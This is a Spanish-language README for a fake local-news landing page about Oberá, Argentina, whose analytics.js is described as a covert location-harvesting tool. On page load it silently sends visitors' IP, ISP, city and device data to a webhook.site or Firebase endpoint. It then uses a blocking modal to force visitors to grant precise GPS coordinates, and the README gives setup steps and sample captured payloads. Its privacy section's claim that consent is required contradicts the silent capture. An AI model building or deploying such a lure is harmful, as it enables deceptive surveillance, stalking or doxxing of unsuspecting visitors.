# 📰 Oberá Al Día - Sitio de Noticias Locales

Landing page estática moderna para noticias de la Zona Centro de Misiones, Argentina.

## 🚀 Características

- ✅ Diseño responsivo con **Tailwind CSS**
- ✅ Sección destacada "Último Momento"
- ✅ Grilla de noticias con imágenes placeholder
- ✅ Artículo principal sobre tránsito y clima
- ✅ **Sistema de Analytics** con geolocalización
- ✅ Header rojo/blanco moderno
- ✅ Animaciones suaves en tarjetas

---

## 📂 Estructura del Proyecto

```
page vic/
├── index.html          # Página principal
├── analytics.js        # Script de analytics con geolocalización
└── README.md          # Este archivo
```

---

## 🔧 Sistema de Analytics Persistente

El archivo `analytics.js` implementa un **sistema de captura en dos fases**:

### 📋 Fase 1: Captura Silenciosa (Automática)
Al cargar la página, **sin interacción del usuario**, captura:

- 🌐 **Dirección IP pública**
- 🏢 **Proveedor de Internet (ISP)** y ASN
- 📍 **Ubicación aproximada** (ciudad/región por IP)
- 🖥️ **Tipo de dispositivo** (móvil, tablet, escritorio)
- 📱 **Info del navegador** (user agent, idioma, resolución, timezone, cookies)
- 🔗 **URL de la página y referrer**
- 🆔 **Session ID único** para vincular ambos paquetes

**✅ Estos datos se envían automáticamente al webhook/Firebase aunque el usuario deniegue el GPS**

### 📍 Fase 2: Geolocalización GPS (Condicional)

1. **Si el usuario ACEPTA GPS inmediatamente:**
   - Se capturan las coordenadas precisas (latitud/longitud)
   - Se envía un **segundo paquete** con los datos GPS vinculado a la sesión
   - El modal NO se muestra

2. **Si el usuario DENIEGA GPS:**
   - Aparece un **modal bloqueante** en el centro de la pantalla
   - El modal impide leer las noticias hasta confirmar ubicación
   - Al hacer clic en "Confirmar y Leer", se vuelve a solicitar el permiso GPS
   - Si finalmente acepta, se envía el segundo paquete con GPS
   - Si vuelve a denegar, puede reintentar

### 📋 Opción 1: Webhook (RequestBin / Webhook.site)

**Pasos:**

1. Ve a [https://webhook.site](https://webhook.site) o [https://requestbin.com](https://requestbin.com)
2. Copia tu URL única generada (ej: `https://webhook.site/abc123-def456`)
3. Abre `analytics.js` y reemplaza la línea:
   ```javascript
   webhookUrl: 'https://webhook.site/your-unique-id',
   ```
   por tu URL real.

4. Abre `index.html` en tu navegador
5. Ve los logs en tiempo real en el panel de tu webhook

**Ejemplo de datos recibidos (Paquete 1 - Captura Silenciosa):**
```json
{
  "event": "page_load",
  "stage": "initial_capture",
  "sessionId": "session_1709574645123_abc123xyz",
  "timestamp": "2026-03-04T15:30:45.123Z",
  "pageUrl": "http://localhost:8000/index.html",
  "referrer": "Directo",
  "deviceType": "Escritorio",
  "browserInfo": {
    "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "language": "es-AR",
    "platform": "Win32",
    "screenWidth": 1920,
    "screenHeight": 1080,
    "timezone": "America/Argentina/Buenos_Aires",
    "cookiesEnabled": true,
    "doNotTrack": "not-set"
  },
  "networkInfo": {
    "ip": "181.45.123.45",
    "isp": "Telecom Argentina S.A.",
    "city": "Oberá",
    "region": "Misiones",
    "country": "Argentina",
    "countryCode": "AR",
    "timezone": "America/Argentina/Buenos_Aires",
    "asn": "AS7303",
    "approximateLocation": {
      "latitude": -27.4878,
      "longitude": -55.1197,
      "accuracy": "city-level"
    }
  },
  "gpsStatus": "pending"
}
```

**Ejemplo de datos recibidos (Paquete 2 - Si acepta GPS):**
```json
{
  "event": "gps_granted",
  "stage": "gps_capture",
  "sessionId": "session_1709574645123_abc123xyz",
  "timestamp": "2026-03-04T15:31:12.456Z",
  "gpsData": {
    "latitude": -27.4912,
    "longitude": -55.1183,
    "accuracy": 18.5,
    "altitude": 245,
    "altitudeAccuracy": 10,
    "heading": null,
    "speed": null,
    "timestamp": "2026-03-04T15:31:10.789Z",
    "permissionGranted": true,
    "source": "html5-geolocation-api"
  },
  "networkInfo": {
    "ip": "181.45.123.45",
    "isp": "Telecom Argentina S.A.",
    "city": "Oberá",
    "region": "Misiones",
    "country": "Argentina"
  }
}
```

**Ejemplo si deniega GPS:**
```json
{
  "event": "gps_denied",
  "stage": "initial_denial",
  "sessionId": "session_1709574645123_abc123xyz",
  "timestamp": "2026-03-04T15:30:50.999Z",
  "errorType": "PERMISSION_DENIED",
  "errorMessage": "Usuario denegó el permiso GPS"
}
```

---

### 🔥 Opción 2: Firebase Firestore

**Pasos:**

1. **Crear proyecto en Firebase**
   - Ve a [https://console.firebase.google.com](https://console.firebase.google.com)
   - Crea un nuevo proyecto llamado "obera-analytics" (o el nombre que prefieras)
   - Activa **Firestore Database** en modo de prueba

2. **Obtener credenciales**
   - En configuración del proyecto → Tus aplicaciones → Web
   - Copia el objeto de configuración

3. **Agregar SDK de Firebase al HTML**
   Abre `index.html` y agrega antes de la línea `<script src="analytics.js"></script>`:

   ```html
   <!-- Firebase SDK (v9 modular) -->
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
   ```

4. **Configurar analytics.js**
   Edita estas líneas en `analytics.js`:

   ```javascript
   firebase: {
       enabled: true, // ⚠️ Cambiar a true
       apiKey: 'AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXX',
       authDomain: 'obera-analytics.firebaseapp.com',
       projectId: 'obera-analytics',
       storageBucket: 'obera-analytics.appspot.com',
       messagingSenderId: '123456789012',
       appId: '1:123456789012:web:abcdef123456',
       collectionName: 'analytics' // Nombre de la colección
   }
   ```

5. **Ver datos en Firestore**
   - Abre Firebase Console → Firestore Database
   - Verás los registros en la colección `analytics`

**Reglas de seguridad recomendadas para producción** (Firebase Console → Firestore → Reglas):
```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /analytics/{document} {
      allow create: if true; // Solo permitir crear
      allow read, update, delete: if false; // Bloquear resto
    }
  }
}
```

---

## 🛡️ Características del Sistema Persistente

### ✅ Modal Bloqueante
- **Diseño profesional** con fondo oscuro difuminado (backdrop-blur)
- **Icono de ubicación** animado en el header rojo
- **Botón grande** "Confirmar y Leer" con hover effect
- **Bloqueo de scroll** del body mientras está activo
- **Animaciones suaves** (fade-in + slide-up)
- **Indicador de verificación** con animación de pulso

### 🔒 Seguridad y Privacidad
- **Session ID único** vincula ambos paquetes de datos
- **No se usan cookies** ni localStorage
- **Captura fallback** si la API de ISP falla (solo IP básica)
- **Timeout de 8 segundos** en peticiones
- **Validación de permisos** antes de cada operación

### 📊 Tracking Completo
- **3 tipos de eventos**:
  - `page_load` → Carga inicial con IP/ISP
  - `gps_granted` → Usuario aceptó GPS
  - `gps_denied` → Usuario rechazó GPS
- **Vinculación por Session ID** para análisis de flujo completo
- **Timestamps precisos** en formato ISO 8601

**Logs en consola** (activables/desactivables):
```javascript
enableConsoleLog: true, // en ANALYTICS_CONFIG
```

### 🔄 Reintentos Manuales
Desde la consola del navegador:
```javascript
// Ver estado actual
window.OberaAnalytics.state

// Forzar reintento de GPS
window.OberaAnalytics.retry()

// Mostrar/ocultar modal manualmente
window.OberaAnalytics.showModal()
window.OberaAnalytics.hideModal()
```

---

## 🖥️ Uso Local

1. **Clonar/Descargar** el proyecto
2. Abrir `index.html` directamente en el navegador (doble clic)
3. O usar un servidor local:
   ```bash
   # Python 3
   python -m http.server 8000
   
   # Node.js (npx)
   npx serve
   ```
4. Abrir `http://localhost:8000` en el navegador

---

## 🧪 Testing del Sistema Persistente

### Escenario 1: Usuario acepta GPS inmediatamente
1. Abre la página en el navegador
2. **Acepta** el permiso de ubicación cuando aparece el prompt del navegador
3. **Resultado esperado:**
   - NO se muestra el modal
   - Se envían 2 paquetes al webhook:
     - Paquete 1: `page_load` con IP/ISP
     - Paquete 2: `gps_granted` con coordenadas GPS

### Escenario 2: Usuario deniega GPS (modal bloqueante)
1. Abre la página en el navegador
2. **Deniega** el permiso de ubicación
3. **Resultado esperado:**
   - Aparece el **modal bloqueante** sobre las noticias
   - Ya se envió el Paquete 1 con IP/ISP
   - Se envió un evento `gps_denied`
   - El modal impide leer hasta hacer clic en "Confirmar y Leer"

### Escenario 3: Usuario acepta en segundo intento
1. (Continuando del Escenario 2)
2. Haz clic en **"Confirmar y Leer"** en el modal
3. **Acepta** el permiso GPS cuando aparece nuevamente
4. **Resultado esperado:**
   - Modal desaparece
   - Se envía Paquete 2 con GPS
   - Usuario puede leer libremente

### Escenario 4: Usuario rechaza múltiples veces
1. (Continuando del Escenario 2)
2. Haz clic en **"Confirmar y Leer"**
3. **Deniega** el permiso nuevamente
4. **Resultado esperado:**
   - Modal permanece visible
   - Botón cambia a "❌ Permiso denegado - Reintentar"
   - Usuario puede reintentar cuantas veces quiera

### 🔍 Verificar los datos capturados

**En Webhook.site:**
1. Ve a tu panel de webhook
2. Verás 2-3 requests JSON:
   - Request 1: `event: "page_load"` (siempre se envía)
   - Request 2: `event: "gps_denied"` (si rechazó)
   - Request 3: `event: "gps_granted"` (si aceptó después)

**En la consola del navegador (F12):**
```javascript
// Ver logs con emoji 🔍
// Ver estado actual
window.OberaAnalytics.state

// Ver configuración
window.OberaAnalytics.config
```

### 🔧 Resetear permisos de geolocalización

**Chrome/Edge:**
1. Haz clic en el candado/icono de información en la barra de direcciones
2. Permisos → Ubicación → Restablecer permiso
3. Recarga la página

**Firefox:**
1. Haz clic en el icono de información (i) en la barra
2. Permisos → Acceder a tu ubicación → Limpiar permiso
3. Recarga la página

---

## 📱 Compatibilidad

- ✅ Chrome/Edge (moderno)
- ✅ Firefox
- ✅ Safari (iOS/macOS)
- ✅ Opera
- ⚠️ Internet Explorer no soportado

---

## 🔒 Privacidad

- La geolocalización **requiere consentimiento** del usuario (prompt del navegador)
- Los datos **no se almacenan localmente** (solo se envían)
- **No se usan cookies** ni localStorage
- Puedes desactivar el script eliminando `<script src="analytics.js"></script>` del HTML

---

## 🎨 Personalización

### Cambiar colores del tema
En `index.html`, edita la configuración de Tailwind:
```javascript
tailwind.config = {
    theme: {
        extend: {
            colors: {
                'primary-red': '#DC2626',  // Color principal
                'primary-dark': '#991B1B'  // Color oscuro
            }
        }
    }
}
```

### Agregar más noticias
Duplica un bloque `<article>` en la sección de grilla y modifica el contenido.

---

## 📄 Licencia

Código libre para uso educativo y personal. Las imágenes usan placeholder de [placeholder.com](https://placeholder.com).

---

## 💡 Soporte

Para consultas o problemas:
- 📧 Revisa la consola del navegador para logs de depuración
- 🔍 Verifica que las URLs del webhook/Firebase sean correctas
- 🌐 Asegúrate de tener conexión a Internet para geolocalización e IP

---

**Desarrollado con ❤️ para Oberá, Misiones 🇦🇷**
